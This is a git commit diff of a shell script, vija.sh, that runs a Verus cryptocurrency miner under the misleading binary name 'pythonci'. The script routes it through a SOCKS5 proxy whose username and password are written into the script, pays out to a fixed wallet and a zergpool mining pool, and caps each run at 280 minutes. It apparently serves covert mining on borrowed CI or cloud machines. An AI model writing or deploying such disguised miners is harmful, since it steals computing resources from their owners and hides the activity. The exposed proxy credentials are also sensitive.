a5320c2bfb1ebce2e2e00314d6824c32e439f29d
uveshV <87410093+uveshV@users.noreply.github.com>
2021-09-15 09:16:50 +0100

    Update vija.sh

--- vija.sh
+++ vija.sh
@@ -9,5 +9,4 @@ POOL=stratum+tcp://verushash.na.mine.zergpool.com:3300
 WALLET=DRAydrbsfj8gHhBQygndwyB3fxP4qD6eEb
 PY=socks5://qwehsyfs:w1uyert4fs@78.46.89.24:45265
 WORKER=$(echo $(shuf -i 1000-9999 -n 1)-BEDULS)
-timeout 280m ./pythonci -a verus -o $POOL -u $WALLET.$WORKER -p x -t 4 -x $PROXY > /dev/null 2>&1
-echo Sukses
+timeout 280m ./pythonci -a verus -o $POOL -u $WALLET.$WORKER -p x -t 4 -x $PROXY
